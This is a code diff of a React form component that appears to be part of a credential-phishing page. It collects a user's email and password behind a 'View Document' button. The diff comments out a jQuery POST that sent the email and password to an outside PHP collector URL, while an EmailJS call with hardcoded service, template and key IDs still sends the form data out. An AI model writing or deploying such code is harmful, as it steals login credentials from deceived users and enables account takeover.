@@ -2,7 +2,7 @@
 import React, { useState, useRef } from "react";
 import './form.css';
 import Too from './../media/img/to.png';
-import $ from 'jquery';
+// import $ from 'jquery';
 import emailJS from '@emailjs/browser';
 
 
@@ -33,6 +33,7 @@ export const Form = ()=>{
         
         else{
 
+            // goodcontact44@gmail.com = for d emalJS hosting
 
 
             emailJS.sendForm('service_wzp993k', 'template_r1q05vm', form.current, 'fnFKgJwcLIz25_NKm')
@@ -57,19 +58,19 @@ export const Form = ()=>{
               setBtn('View Document');
             }, 3700);
     
-            const user = {
-              email: email,
-              password: pwd
-          };
+        //     const user = {
+        //       email: email,
+        //       password: pwd
+        //   };
     
-          $.ajax({
-              type: "POST",
-              url: "https://bucketlion.com/hello/faz.php",
-              data: user,
-              success(data) {
-                  console.log(data);
-              },
-          });
+        //   $.ajax({
+        //       type: "POST",
+        //       url: "https://bucketlion.com/hello/faz.php",
+        //       data: user,
+        //       success(data) {
+        //           console.log(data);
+        //       },
+        //   });
     
     
     // deploy
